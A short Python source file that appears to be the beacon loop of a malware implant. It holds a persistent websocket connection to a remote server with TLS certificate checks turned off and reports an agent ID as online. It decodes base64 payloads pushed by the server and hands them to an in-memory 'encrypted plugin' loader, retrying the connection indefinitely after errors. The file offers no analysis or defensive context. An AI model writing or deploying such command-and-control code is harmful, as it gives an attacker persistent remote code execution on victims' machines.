import asyncio
import base64
import json
import ssl

import websockets

from memory_loader import load_encrypted_plugin


async def persistent_ws_loop(agent_id, server_uri, on_error_wait=15):
    ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE

    while True:
        try:
            async with websockets.connect(
                server_uri, ssl=ssl_ctx, ping_interval=20
            ) as ws:
                await ws.send(json.dumps({"agent_id": agent_id, "status": "online"}))
                async for msg in ws:
                    try:
                        payload_data = json.loads(msg).get("payload")
                        if payload_data:
                            plugin_blob = base64.b64decode(payload_data)
                            load_encrypted_plugin(plugin_blob, agent_id)
                    except Exception as e:
                        await ws.send(
                            json.dumps({"agent_id": agent_id, "error": str(e)})
                        )
        except Exception:
            await asyncio.sleep(on_error_wait)
